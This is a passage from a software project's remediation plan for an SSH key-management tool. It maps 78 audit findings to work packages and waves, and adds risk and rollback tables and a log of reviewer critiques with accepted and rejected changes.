| **P09-impl** audit trust posture | P09 | D14–D19 (+ D29) | P05, P07, P11, P14 | Task 0 (integrator, serial) adds `PostureIssue`, new error kinds and `ReadResult.Posture` to `internal/fleet`; then two parallel agent waves on disjoint files. |
| **S1** `validate` + `audit --server` | P10 | D25, D25a | P06, P07, P13, P04-impl | `validate` refuses D29 policy conflicts (exit 3). |
| **S2** flag renames | P10 | D26 | P01, P06, P12 | Regenerates help goldens + README tables in the same commit; updates P06's `followUp`. No hidden aliases (no release has shipped). |
| **S3a** tags (`@tag`) | P10 | D20, D20a | P04-impl, P12 | `Covers`, `ExceptCarveOut` and `revoke.go:250` move to a shared helper; P12's encoder carries the new field; a D1a access tombstone blocks tag-derived access. |
| **S3b** groups | P10 | D20b | S3a | Same helper; a D1a access tombstone blocks group-derived access. |
| **S4** `protected:` | P10 | D21, D21a | S3b | |
| **S5** bastions `via:` | P10 | D23 | P03, P11, P13, P14 | `sshtest` needs `direct-tcpip`; one bastion connection per target, ≤ 8 per bastion; update `sshconn.DialHint` and its goldens. |
| **S6** `preserve:` | P10 | D24, D24a | P05, P11 | Keeps "never write a server with no desired keys" (no wipe mode). |

Schema slices (P04-impl, S3a, S3b, S4–S6) all edit `internal/config/config.go`, the top-level key list in `internal/manifest/manifest.go` and P12's encoder, so they run **one at a time**.

---

## Finding → package coverage

Every one of the 78 finding IDs appears exactly once. "Spec" means the package writes a design spec and the code lands in the slice named in the last column.

| ID | Sev | Finding | Package | Wave | Kind | Decision | Lands in |
|---|---|---|---|---|---|---|---|
| SEC-1 | LOW | audit reports a server as compliant even when other local users can write its authorized_keys | P09 | W1 | spec | D14 | W5+ (P09-impl) |
| SEC-2 | LOW | revoke can exit 0 while the revoked key is still installed on servers it never contacted | P04 | W0 | spec | D3, D28 | W4 (P04-impl) |
| SEC-3 | LOW | adopt turns an unknown key found on every server into a grant for future servers too | P04 | W0 | spec | D5 | W4 (P04-impl) |
| SEC-4 | LOW | A self-including ssh_config Include leads to exponential parsing: over 8 GB of memory and a hang | P05 | W1 | fix | — | W1 |
| SEC-5 | LOW | Every server is offered every agent key, so a compromised server can list the operator's other identities | P09 | W1 | spec | D17 | W5+ (P09-impl) |
| SEC-6 | LOW | The release workflow publishes and signs an image for any v* tag without running tests or vulnerability scans | P02 | W0 | fix | — | W0 |
| SEC-7 | LOW | The manifest lock file is opened with O_CREATE and follows symlinks | P12 | W2 | fix | — | W2 |
| SEC-8 | LOW | A hostile server can put up to 1 MiB of near-invisible text into report error lines | P11 | W2 | fix | — | W2 (Task 7 stderr, Task 7b handshake/disconnect text) |
| WP-1 | MEDIUM | Any probe failure, even a network blip, rolls the server back, which can put a revoked key back | P08 | W1 | spec | D9 | W5+ (P08-impl) |
| WP-2 | LOW | The rollback safety net lives only in the client, so if the client dies after the mv the new file stays unprobed | P08 | W1 | spec | D12 (stated) | W5+ (P08-impl) |
| WP-3 | LOW | The compare-and-swap check runs before the upload, so a concurrent edit is silently lost with no backup | P11 | W2 | fix | — | W2 |
| WP-4 | LOW | Nothing is fsynced, so a crash right after apply can leave an empty authorized_keys | P11 | W2 | fix | — | W2 |
| WP-5 | MEDIUM | The probe offers keys in a different order from later runs, so it misses a newly added forced command= | P11 | W2 | fix | D31 | W2 |
| WP-6 | LOW | A failed probe followed by a failed restore exits 1, the same as benign drift | P08 | W1 | spec | D10, D28 | W5+ (P08-impl) |
| WP-7 | LOW | A stale lock blocks the server for good, with no way to tell who left it or when | P08 | W1 | spec | D11 (stated) | W5+ (P08-impl) |
| WP-8 | LOW | Backup retention loses hand-maintained data | P08 | W1 | spec | D13 (stated) | W5+ (P08-impl) |
| WP-9 | LOW | A refused write can still create ~/.ssh, so 'refusals change nothing' is not quite true | P11 | W2 | fix | — | W2 |
| WP-10 | LOW | The authorized_keys2 check only runs when the path is spelled exactly '~/.ssh/authorized_keys' | P11 | W2 | fix | — | W2 |
| ARC-1 | MEDIUM | Two manifest-saving paths with different safety: an in-place `--merge` write can silently undo a revoke and changes the file's permissions | P12 | W2 | fix | — | W2 |
| ARC-2 | LOW | The safety-critical write workflow lives in package main as a set of callbacks | P14 | W3 | fix | — | W3 |
| ARC-3 | MEDIUM | Dependency direction is inverted: the SSH transport depends on the audit package, so write errors lose their classification | P14 | W3 | fix | — | W3 (the write-phase `error_kind` bug lands early as P07 Task 7, W1) |
| ARC-4 | LOW | internal/apply is described as 'pure' but depends on the SSH transport and contains revoke/rotate presentation | P14 | W3 | fix (partial) | — | W3: transport half (S3); presentation split is follow-up F-ARC-4b |
| ARC-5 | LOW | The fleet-read setup is copied three times, and audit ignores the helper that already exists | P06 | W1 | fix | — | W1 |
| ARC-6 | LOW | The manifest schema is defined in four parallel shapes with four hand-written renderers | P12 | W2 | fix | — | W2 |
| ARC-7 | LOW | Key-option meaning is matched as strings in four places, and two security-relevant options are misclassified | P05 | W1 | fix | D27 | W1 |
| ARC-8 | LOW | Layering is not machine-enforced, so documented boundaries have already drifted | P14 | W3 | fix | — | W3 |
| COR-1 | MEDIUM | One odd key line on any server makes the whole adopt fail with a misleading "bug:" error (exit 3), and --partial cannot get past it | P05 | W1 | fix | — | W1 |
| COR-2 | LOW | apply calls a server converged (exit 0) when nobody is granted on it but authorized_keys2 still holds keys; audit calls the same server drift (exit 1) forever | P11 | W2 | fix | D30 | W2 |
| COR-3 | LOW | `revoke USER` refuses valid user names that contain a space, equal an option word (tunnel, pty, from, restrict…), or start with a key type | P12 | W2 | fix | — | W2 |
| COR-4 | LOW | The check that flags a rewrite as loosening a key gets the FIDO options backwards and never sees added relaxations | P05 | W1 | fix | — | W1 |
| COR-5 | LOW | audit's critical tier (exit 2) misses operator keys that are on the server but cannot log in | P09 | W1 | spec | D15 | W5+ (P09-impl) |
| COR-6 | LOW | An impersonating server can turn the host-key exit-2 alarm into a plain exit-1 "unrecorded type" result | P09 | W1 | spec | D16 | W5+ (P09-impl) |
| COR-7 | LOW | After Ctrl-C, audit, adopt and the apply plan phase still try every remaining server and print one warning per server | P07 | W1 | fix | — | W1 |
| UX-1 | MEDIUM | Plans and audits label the keys they delete as "(unknown)" and hide the on-server comment, so you approve deletions you can't identify | P07 | W1 | fix | — | W1 |
| UX-2 | MEDIUM | A Dependabot pflag bump rewrote every boolean flag in --help as `--flag[=true\|false]`, and the README-sync test didn't notice | P01 | W0 | fix | — | W0 |
| UX-3 | MEDIUM | Unreachable-server errors are stuttered, carry a baked-in hint that pollutes JSON, print twice, and don't match the README samples | P07 | W1 | fix | — | W1 |
| UX-4 | LOW | `adopt --partial` exits 0 and reports 'nothing to adopt' even when it read none of the servers | P12 | W2 | fix | D8, D8a | W2 |
| UX-5 | MEDIUM | Copy-paste follow-up hints after revoke/rotate drop flags the run needed | P06 | W1 | fix | — | W1 |
| UX-6 | LOW | Re-running an interrupted revoke fails with a bare tool error | P06 | W1 | fix | — (D1c completes it in W4) | W1 |
| UX-7 | LOW | The same flag names mean different things on different commands | P10 | after W4 | spec | D26 | W1 minimal fix (P06 Task 7b); renames in W5+ slice S2 |
| UX-8 | LOW | Raw cobra/pflag errors leak through in inconsistent formats | P06 | W1 | fix | — | W1 |
| UX-9 | LOW | --help has no examples, and `audit --help` doesn't mention exit codes | P06 | W1 | fix | — | W1 |
| UX-10 | LOW | Quick start step 1 suggests `adopt` first, but adopt needs a manifest you don't have yet | P06 | W1 | fix | — | W1 |
| UX-11 | LOW | Count strings aren't pluralized, despite the docs saying they are | P06 | W1 | fix | — | W1 |
| UX-12 | LOW | CLAUDE.md's container section describes an image the project no longer ships | P02 | W0 | fix | — | W0 |
| UX-13 | MEDIUM | pflag v1.1.0 (Dependabot #1, merged 2026-11-07) renders every boolean flag in --help as --flag[=true\|false]; README sync test only compares flag names so CI stayed green | P01 | W0 | fix | — | W0 |
| PRD-1 | HIGH | Revocation has no memory: a revoked key that survives anywhere is laundered back into the manifest by `adopt --merge` | P04 | W0 | spec | D1, D2, D29, D1a, D1b, D2a | W4 (P04-impl) |
| PRD-2 | MEDIUM | The 'single source of truth' is any local copy: applying a stale checkout silently re-grants revoked access, and nothing on the server can detect it | P04 | W0 | spec | D4, D4b, D4a | W4 (P04-impl); Quick start push-before-apply in W1 (P06 Task 9) |
| PRD-3 | MEDIUM | No bastion / ProxyJump support is a blocker, not a deferral, for most real fleets | P10 | after W4 | spec | D23 | W5+ slice S5 |
| PRD-4 | MEDIUM | Flat user-to-server access with no groups, roles or host tags; YAML anchors, the only reuse mechanism, break revoke and rotate | P10 | after W4 | spec | D20b | W5+ slice S3b |
| PRD-5 | LOW | The wildcard is the only selector and spans every remote account, so `["*"]` also grants root and service accounts | P10 | after W4 | spec | D20, D20a | W5+ slice S3a |
| PRD-6 | LOW | Restrictions (from=, command=, restrict) belong to the key, not the grant, so one key cannot be restricted differently per server | P10 | after W4 | spec | D22 | W5+ slice deferred (D22 rec.: not now) |
| PRD-7 | MEDIUM | `operator: true` conflates 'protected management key' with 'installed on every account, unconditionally' | P10 | after W4 | spec | D21, D21a | W5+ slice S4 |
| PRD-8 | MEDIUM | Full-file ownership with no co-management mode fights cloud guest agents and app-managed accounts forever | P10 | after W4 | spec | D24, D24a | W5+ slice S6 |
| PRD-9 | MEDIUM | Audit claims to answer 'who can log into which server?' but only sees one file per listed account | P09 | W1 | spec | D18 | W5+ (P09-impl) |
| PRD-10 | MEDIUM | No key policy: DSA keys, 1024-bit RSA and already-expired keys load silently and are audited as 'present & authorized' | P09 | W1 | spec | D19, D29 | W5+ (P09-impl) |
| PRD-11 | LOW | Onboarding and GitOps workflow gaps: no grant command, no offline validate, and audit cannot target servers | P10 | after W4 | spec | D25, D25a, D25b | W5+ slice S1 |
| TST-1 | HIGH | The write script's ownership checks (exit 48) are never tested; deleting all of them leaves every test green | P03 | W0 | fix | — | W0 |
| TST-2 | MEDIUM | The parsers are only checked against themselves, and this hides a real bug: one option typo on any server makes adopt abort | P05 | W1 | fix | — | W1 |
| TST-3 | MEDIUM | The login probe's main promise (it catches a written command=/from= that locks you out) is only tested with a mock | P03 | W0 | fix | — | W0 |
| TST-4 | LOW | The README/--help sync test checks only flag names, skips import and the global flags, and existing drift already passes it | P01 | W0 | fix | — | W0 |
| TST-5 | LOW | The integration and E2E environment is one Alpine container: busybox userland, one sshd_config, no root target, no multi-host fleet | P13 | W2 | fix | — | W2 |
| TST-6 | LOW | Fuzzing is thin: the terminal-injection sanitizer is never fuzzed in CI and its oracle is weak | P13 | W2 | fix | — | W2 |
| TST-7 | LOW | The coverage gate is far below actual coverage and has never been ratcheted | P14 | W3 | fix | — | W3 |
| TST-8 | LOW | keepOwner (keeping the manifest's owner on save) is never exercised | P12 | W2 | fix | — | W2 |
| TST-9 | LOW | Integration tests depend on order through shared container users | P03 | W0 | fix | — | W0 |
| TST-10 | LOW | import's ssh-config resolution is checked against `ssh -G` only by hand | P05 | W1 | fix | — | W1 |
| OPS-1 | MEDIUM | A release can ship from any commit that never passed CI, and gets signed anyway | P02 | W0 | fix | D6 | W0 |
| OPS-2 | LOW | The documented cosign verify command accepts a signature from any workflow on any ref in the repo | P02 | W0 | fix | — | W0 |
| OPS-3 | MEDIUM | Published images are never CVE-scanned, at release or afterwards, and CI's govulncheck checks a different Go than the one that ships | P02 | W0 | fix | — | W0 |
| OPS-4 | LOW | arm64 is compiled under QEMU and never tested; the gated image is not the artifact that gets pushed | P02 | W0 | fix | — | W0 |
| OPS-5 | LOW | Several pins are invisible to Dependabot, contradicting the 'Dependabot bumps both' comment | P13 | W2 | fix | — | W2 |
| OPS-6 | LOW | Dependabot has no cooldown, so a freshly published malicious version is proposed within days | P02 | W0 | fix | — | W0 |
| OPS-7 | LOW | Integration and E2E test files are never vetted, linted or gosec-scanned | P13 | W0 (lane P13-0) | fix | — | W0 |
| OPS-8 | LOW | Daily fuzzing skips FuzzRemote and throws away its corpus each day; README overstates it | P13 | W2 | fix | — | W2 |
| OPS-9 | LOW | Several CLAUDE.md quality gates are not actually in `make check` or CI | P13 | W2 | fix | — | W2 |
| OPS-10 | LOW | Only the container image carries a version; `make build` and `go install` binaries report "dev", and no signed release binaries exist | P13 | W2 | fix | D7 | W2 |
| OPS-11 | LOW | README's Kubernetes CronJob example runs an unattended fleet-wide write from a mutable `:latest` tag with no pod hardening | P02 | W0 | fix | — | W0 |

Total: 78 IDs, each in exactly one package (55 fix, 23 spec). Two rows note an early part landing in another package's wave (ARC-3's bug in P07, UX-7's header line in P06); the ID still belongs to one package.

### Merged duplicates (one package each, so no work repeats)

- UX-2 and UX-13 (pflag `--help`) → P01
- SEC-6 and OPS-1 (release gating) → P02
- COR-1 and TST-2 (adopt and unknown options); ARC-7 covers COR-4 → P05
- TST-6 and OPS-8 (fuzz) → P13
- PRD-4 and PRD-5 (selectors: groups and tags) → P10 / D20
- ARC-8 needs ARC-3 and ARC-4 first → all three in P14 (ARC-3's behavior fix runs early in P07 Task 7)

### Data issue in the findings file

The `verifier` fields of UX-2, UX-3 and UX-4 are shifted: UX-2's holds UX-3's text, UX-3's holds UX-5's, and UX-4's holds UX-2's. So UX-4 (`adopt --partial`) has no independent verification; P12 Task 8 reproduces it with a failing test before fixing it. The UX-3 verifier text actually describes `editrun.go` items, which P06 covers.

### Findings folded into on-hold decisions

| Finding | Its suggested fix overlaps | What this plan does instead |
|---|---|---|
| PRD-1 | `prune` (`revoke --key` removing unowned keys fleet-wide) | Tombstones and detection only (D1, D1a, D1b). Keys are removed only by apply's normal full-file rewrite on servers the manifest covers. | | P04 | W0 | spec | D1, D2, D29, D1a, D1b, D2a | W4 (P04-impl) |
| SEC-2 | `prune` | The opt-in post-revoke sweep only reads and reports (D3), including `authorized_keys2`. | | P04 | W0 | spec | D3, D28 | W4 (P04-impl) |
| PRD-2 | `apply --force` (an override for the serial refusal) | No override flag. Removal-only writes are never blocked; the escape hatch is editing `serial:` by hand, which the refusal names (D4). | | P04 | W0 | spec | D4, D4b, D4a | W4 (P04-impl); Quick start push-before-apply in W1 (P06 Task 9) |
| PRD-10 | scheduled rotation (key age, `added:`, "overdue") | Only strength and expiry rules (D19); age-based checks are excluded. |
| COR-2 | apply wipe/empty-server mode (a keys2-only write on a server with no grants) | If D30 = yes, P11 refuses that server and writes nothing, so apply and audit agree on exit 1. | | P11 | W2 | fix | D30 | W2 |
| PRD-8 | apply wipe/empty-server mode | D24's `preserve:` keeps the "never write a server with no desired keys" rule. | | P10 | after W4 | spec | D24, D24a | W5+ slice S6 |
| — | `import --prefer`, `move-key`, key generation | Not proposed anywhere. |

---

## Risks and rollback

| Risk | Where | Mitigation | Rollback |
|---|---|---|---|
| A patch no longer applies because the base moved (round 2, or a repair). | every wave | Every lane checks out the round's `baseSha` (from the scout or the previous round's integrator) and reports the base it used; the integrator applies with `git apply --3way` and resolves by re-reading the package section. | Re-run that lane from the new `baseSha`. |
| A lane hands back a file it does not own (a local stub, a fuzz crasher, a foreign edit). | every wave | The lane unstages every path outside its globs before writing the patch; the integrator rejects any patch whose `git apply --numstat` lists a foreign path. | Re-run the lane. |
| Verifiers collide (shared `coverage.out`, mutations, one container name). | every wave | Verifiers run in their own worktrees at the committed SHA, reuse the integrator's gate output, and only one per wave runs `make integration`, under the lock. | Re-run the verifier. |
| Two `make integration` runs collide on the fixed container name `sshepherd-it`. | W0 P03-B (incl. its scratch mutation runs), W2 P11, P13-D, one verifier | One run per machine through `$PATCH_DIR/it.lock` with an owner record, waited on with a Monitor/background loop, broken after 30 minutes, until P13 Task 10 gives unique names. | Re-run the failed gate alone. |
| The write-script change (P11) breaks a real server's `authorized_keys`. | W2 | P03's mutation-checked tests land first (W0). P11 adds unit shell-matrix and real-sshd cases, and P13 runs them on alpine, debian and rocky. The CAS, `.bak` and the login probe still guard every write. | `git revert` the P11 commit; SSHepherd keeps no server-side state, so reverting the client restores the old behavior. Servers keep `.bak`/`.orig`. |
| A CI or release change breaks only on GitHub. | W0 P02, W2 P13 | CI preflight on `preflight/<wave>` before the push (D0); post-push `release.yml` dispatch dry run; tags move only after the `--dry-run` digest check; the README `cosign verify` runs inside `publish`; the D6 tag ruleset and the recorded release-gating SHA. | `git revert` the lane's commit (P02 and P13 commit per lane); the Release recovery runbook (P02) covers a bad tag or image. |
| A dependency bump changes user-visible text again. | P01 and later | `testdata/help/*.golden` + README sync test fail the Dependabot PR. | Re-run `-update`, review, re-copy README. |
| The cobra template replacer misses after a cobra upgrade. | P01 | `TestUsageTemplateRoutesBothFlagSections` fails loudly. | Fallback: pin pflag v1.0.9 plus a Dependabot ignore. |
| Golden churn hides a real regression. | W1, W2 | Every regenerated golden is read by eye; P14 asserts goldens are unchanged by its refactor. | Revert the package commit. |
| A wave stalls on an owner decision. | W1, W2, W4 | Every fix package names a safe default (D27, D8, D8a, D30, D31, D7). W3 (P14) needs no decision; only W4 waits for Block 1. | — |
| Coverage ratchet set too high makes `make check` flaky. | W3 | `COVERAGE_MIN` = floor(measured) − 1, measured on production packages only. | Lower by one in a follow-up commit. |
| A refactor (P14) changes behavior. | W3 | The existing cmd tests, goldens and E2E are the behavior lock; only import paths may change. | `git revert` the step's commit (one commit per step). |
| A force-push is needed to undo a mistake. | all | Force-push is blocked by a ruleset; fix forward. | `git revert <sha>` and push. |
| Spec decisions drift from what was implemented. | W4, W5+ | Each spec states its README sections and its rows of the one shared exit-code table (D28); the integrator updates README + CLAUDE.md Status in the same commit; verifier lens 2 checks they agree. | Amend the spec in a follow-up commit. |
| A write-path fix opens a new hole. | W2 P11 | The panel's security review removed the second probe, added the post-mkdir walk with cleanup, and replaced the global `sync`; each has a test that fails on the earlier draft. | `git revert` the P11 commit. |

---

## Review log

Six reviewers critiqued the first draft on 2026-11-07. Each critique was checked against the plan and the code at `adee207` (for example: `git check-ignore -v .claude/worktrees/x/foo.go` prints nothing; `internal/config/config.go:361-388` has no `..` check; `internal/sshwrite/sshwrite.go:194-210` runs `mkdir -p` before the walk; `internal/apply/exec.go:118-124` documents why restricted survivors are probed last; `internal/sshconn/connect.go:225` wraps handshake errors unbounded; `internal/sshconn/sshconn.go:83-85` probes keys2 with `[ -s ]` only; `gofmt -l ./...` fails with `lstat ./...`; `testkeys` has only `Line`; `audit.ExitCode` takes `(cfg, results)`; the real manifest fuzz targets are `FuzzMergeRoundTrip`/`FuzzManifestEdit`; `git tag -l` is empty). One line per critique.

**arch-parallel — 15 accepted, 0 rejected**
- Accepted (BLOCKER): plan untracked → Pre-W0 commits it; lanes `test -f` the plan in their worktree; specs/plans committed before their wave.
- Accepted: verifiers collide → own worktree at the committed SHA, reuse the integrator's gate output, one integration verifier per wave under the lock, lens 0 needs a clean re-run.
- Accepted: `.claude/worktrees/` not ignored → added to `.gitignore` in Pre-W0; scout proves `make fmt secrets` ignores a worktree.
- Accepted: no ownership enforcement → lanes unstage foreign paths; integrator rejects any patch whose numstat lists a foreign path; `l.files` passed in.
- Accepted: W2 same-round dependencies → P12-C and all of P13-B Task 6 moved to round 2; `BENCHSTAT_VERSION` moved to lane A.
- Accepted: W4 rounds commit drafts too early → P14 runs one step per round (S2, S3, S4, S5, S6).
- Accepted: ARC-3 bug deferred → P07 Task 7 in W1 with the three-value `jsonErrorFor`; P14 keeps only the move.
- Accepted: W3/W4 order depended on timing → P14 is always W3, P04-impl always W4, its plan written after P14.
- Accepted: fake distro jobs in round 1 → Task 12 Step 4 moved to lane D in round 2; lane C narrowed to trivy/dockle pin files; D lists the sshd Dockerfiles.
- Accepted: unchecked worktree base → scout and integrators return `baseSha`; lanes check it out and report it.
- Accepted: one lens set for mixed waves → `kind: 'fix'|'spec'`, `LENSES_FIX`/`LENSES_SPEC`, no gates for spec lanes.
- Accepted: H1 was integrator-written code → P07 Task 8 with a frozen `RewriteRow.Widens` contract; apply-json spec amendment.
- Accepted: dispatch dry run before push is impossible → moved to a post-push check (step 7).
- Accepted: hot-file table incomplete → rebuilt from all ownership tables; scout checks each previous owner's commit.
- Accepted: COR-2 and UX-4 change exit codes without a decision → D30 and D8a, safe default today's behavior.

**security-writepath — 11 accepted (2 in part), 0 rejected**
- Accepted (BLOCKER): second key-files-only probe removed; one probe in production order; P11 names the behavior change (D31); warn-only headless proof moved to P08 as D9b.
- Accepted in part: WP-9 `..` → post-mkdir full walk with cleanup of created directories and two shell-matrix rows; rejecting `.`/`..` in `validateAuthorizedKeysFile` not adopted (schema tightening needs a decision, `internal/config` is unowned in W2, and the walk alone closes the hole).
- Accepted: P08 probe verdicts sorted by stage (anything after auth restores), 15s probe-exec deadline, "unknown is safe because of the guard" removed, new tests.
- Accepted: P08 reconnect takes the lock before re-reading; fourth outcome (auth failure on reconnect → `lockout_unrestored`); seamed tests.
- Accepted: no global `sync` → per-file `dd conv=notrunc,fsync`, directory not flushed (documented), risk note rewritten, test asserts no bare `sync`.
- Accepted: SEC-8 handshake/disconnect text → P11 Task 7b in lane 11B (`connect.go` is free in W2 and `RemoteSnippet` lands there), so SEC-8 is fully fixed in P11 rather than split to P14.
- Accepted: sweep also reads `authorized_keys2`; unreadable keys2 gives exit 1, never 0; `TestRevokeSweepFindsKeyInKeys2`.
- Accepted in part: serial → removal-only plans never blocked, serials above M+1000 are forged (audit exit 2, apply proceeds); the reviewer's separate "D4b" question is folded into D4's text as a stated rule (it corrects the recommended design rather than adding a preference), and D4b is used for hand edits (completeness).
- Accepted: WP-3 integration test waits for the temp file before the concurrent edit; must fail on the pre-P11 script.
- Accepted: P03 mutation instruction rewritten (remove only the file check on a clean copy; only `ffile` fails; same `replaceNth` index).
- Accepted: `OfferRank` built only from P05's table; `TestOfferRankAgreesWithGuard`.

**testing — 11 accepted, 0 rejected**
- Accepted: sync test could never fail → skip keys on a `wc` marker; FAILs today on dash and bash.
- Accepted: WP-3 integration test fails only by chance → polls for the temp file first; recorded FAIL on the old script.
- Accepted: WP-5 proven only with fakes → hermetic `TestApplyThenAuditUsesPlainKeyFirst` on `sshtest`'s `AuthorizedKeysFile` mode plus a real-sshd row.
- Accepted: D27 fallback broke `make check` → D27 asked before W1; P05 Task 2 carries the complete alternate diff.
- Accepted: lanes that cannot run their own tests → P12-C in round 2; 11A's stub implements the cap-and-mask contract.
- Accepted: integration files untyped until W2 → OPS-7 runs in W0 as lane P13-0.
- Accepted: placeholders → full bodies for `TestBuildBadOptionKnownKeyNotExtended`, the P12 in-place tests and the P14 `fixture`; real helper names (`fpOf` via `authkeys.ParseLine`, `audit.ExitCode(cfg, results)`).
- Accepted: literal "17 fuzz targets" → equality with `grep -rh '^func Fuzz'`.
- Accepted: `gofmt -l ./...` fails → `test -z "$(gofmt -l .)"`.
- Accepted: P04-impl E2E written after the fact → failing-first lane F in W4a; unreachable server simulated with a closed port; no Makefile fuzz edit.
- Accepted: bare `mkdir` lock → owner record, Monitor/background wait, 30-minute stale break, and scratch mutation runs take the same lock.

**product-ux — 13 accepted (2 in part), 0 rejected**
- Accepted: exit 2 meaning never asked → D28 first in Block 1; P06 footer no longer says "(never 2)"; P08/P09 defer to one table.
- Accepted: manifest content as load errors → D29 (audit reports critical, apply skips servers, `validate`/saving commands refuse); D19a folded in.
- Accepted: D4 oversold → limits stated in the question, honest escape hatch in the refusal, Quick start pushes before apply (P06 Task 9), option (2) offered.
- Accepted: D3 hid its costs → costs in the question; recommendation changed to opt-in `--sweep` plus a printed `audit` command.
- Accepted: single-lens problems dropped → lens 1 with file:line and lens 2 with a failing comparison confirm alone; `findingId` enum; unconfirmed problems reported.
- Accepted: Quick start left two files → `import --servers-only` then `adopt --merge`, plus `TestQuickStartBootstrap`.
- Accepted: UX-7 minimal fix needs no decision → P06 Task 7b ("keeps access to N other servers"); D26 shortened, no aliases.
- Accepted in part: too many questions → D11–D13 stated (in P08-impl rather than P11, to keep P11's write-script scope), quick questions first, sub-questions in the table with technical ones as spec defaults; the total asked still grows because other reviewers' fixes add D0, D8a, D28–D31, D4b, D1c, D9b, D20b.
- Accepted: jargon in questions → D1a, D1b, D10, D16, D17, D27 rewritten as one plain sentence each.
- Accepted in part: P10 is a roadmap → its spec now runs after W4, questions reordered by value, D20 split into tags and groups, tombstone interplay required; it stays in this plan only so each of its 8 IDs remains covered once.
- Accepted: idempotent revoke → D1c, built in W4 with P04-impl.
- Accepted: D17 per-command default → one rule on every command with an offer-all fallback and warning.
- Accepted: hidden P01 choice → "if the owner rejects" wording removed; the pflag pin is an engineering rollback only.

**ops-release — 13 accepted (2 in part), 1 rejected**
- Accepted: tags moved before the digest check → `imagetools create --dry-run` hash check first, semver tags verified, `latest` last.
- Accepted in part: changes untested before push → CI preflight on `preflight/<wave>` (D0) and GHCR package public as a required owner step; the canary `publish-dryrun` signing job is rejected because it would give a dispatchable run `id-token` + `packages: write`, the privilege the gating removes.
- Accepted: CVE scan blocked the fuzz cache → separate `published-image-scan` job; `actions/cache/restore` + `actions/cache/save` with `!cancelled()`.
- Accepted in part: Dependabot vs lockstep → separate `golang` and `runtime-and-ci-images` groups and `GO_PIN` in the lockstep check plus a documented bump procedure; the suggested `ignore` of Go patch/minor bumps is not adopted (it would hide toolchain security updates).
- Accepted: pre-W0 commits can be tagged → D6 asked before the W0 push, tag ruleset a precondition, release-gating SHA recorded; `release` environment offered as optional.
- Accepted: per-ref concurrency → global `release` group and a newest-tag guard for `latest`.
- Accepted: no recovery runbook → "Release recovery" in P02 and README.
- Accepted: actionlint/shellcheck split → `-shellcheck=` everywhere (deterministic), same command locally and in wave exits.
- Accepted: renamed required checks → `ci-ok` aggregator; owner requires only that.
- Accepted: binaries widened `publish` → separate `release-binaries` job, `govulncheck -mode=binary`, native arm64 run, macOS quarantine note.
- Accepted: unsigned provenance → `actions/attest-build-provenance` + `gh attestation verify` in README.
- Rejected: scan every supported minor line → no release exists yet; README instead states the policy "only the latest release is scanned and patched", to revisit at the second minor line.
- Accepted: one commit for all of P13 → one commit per lane for P13 and for P02 (A, B).
- Accepted: cosign version unpinned → `COSIGN_VERSION` pinned, README states the minimum, V1 checks against the last v2.

**completeness — 10 accepted, 0 rejected**
- Accepted: specs contradict on exit codes → one shared table via D28; P09's line replaced; revoke/rotate `--json` contract widens; first exit-2 wave (W4) rewrites README:1340-1350.
- Accepted: unnumbered sub-questions → D14a–c, D17a–b (spec defaults), D20a, D21a, D24a, D25a, D25b in the table; P09's "option 2 was not chosen" made conditional.
- Accepted: hand edits never bump the serial → D4b (apply bumps through the store) and `TestE2EStaleManifestAfterHandEdit`.
- Accepted: ARC-4 half dropped silently → marked partial in the coverage table, follow-up F-ARC-4b, CLAUDE.md no longer calls `internal/apply` pure.
- Accepted: verifiers mutate the shared checkout → worktree isolation (same fix as arch-parallel).
- Accepted: free-text grouping → `findingId` + `location` grouping; unconfirmed problems passed on as a report.
- Accepted: F-P07-1 shipped a regression across W1 → fixed in W1 as round-2 lane P07-F1 (a lane rather than an integrator merge fix, so it keeps its own FAIL → PASS).
- Accepted: placeholders and wrong names → `FuzzMergeRoundTrip`/`FuzzManifestEdit`, `apply.Plural` (`report.go:27`), `TestHelpGolden`, full test bodies.
- Accepted: actionlint added to `make check` without a finding → kept as a verification step only; its version listed with the hand-bumped tools.
- Accepted: questions ordered by lead time → the quick ones that unblock W1/W2 come first; D27's answer is applied directly by the P05 lane.

**Unresolved after this revision (for the owner):**
- The question count grew to 43 (7 quick ones before W2; Block 5's 13 come only after W4). The panel's fixes added more questions than they removed.
- `COSIGN_VERSION` and the `attest-build-provenance` SHA are pins the P02 agent resolves at execution time (Step 3 fails if either is left unresolved).
- D0 (the throwaway preflight branch) is a small exception to "commit straight to master, no branches"; if the owner says no, CI and release changes are first exercised after they are live on master.
